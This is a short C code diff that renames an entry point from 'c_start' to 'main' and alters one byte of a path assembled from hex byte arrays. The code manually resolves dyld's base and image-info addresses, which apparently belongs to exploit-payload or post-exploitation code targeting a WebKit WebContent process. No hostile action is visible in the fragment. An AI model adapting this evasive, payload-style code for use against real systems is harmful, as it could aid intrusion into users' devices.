@@ -17,7 +17,7 @@ char* combineStrings(char* str1, char* str2) {
     return combined;
 }
 
-int c_start(void) {
+int main(void) {
     uint64_t dyldBase = getDYLDBase();
     uint64_t dyldAllImageInfoAddr = getDYLDAllImageInfoAddr(dyldBase);
     if (dyldAllImageInfoAddr == 0) {
@@ -42,7 +42,7 @@ int c_start(void) {
     static GLOB char relativePath_5[] = {0x69, 0x74, 0x2e, 0x57, 0x65, 0x62};
     static GLOB char relativePath_6[] = {0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e};
     static GLOB char relativePath_7[] = {0x74, 0x2f, 0x41, 0x41, 0x41, 0x41};
-    static GLOB char relativePath_8[] = {0x41, 0x42, 0x0};
+    static GLOB char relativePath_8[] = {0x41, 0x41, 0x0};
     for (int i = 0; i < 6; i++) {
         (relativePath + 0)[i] = relativePath_0[i];
     }
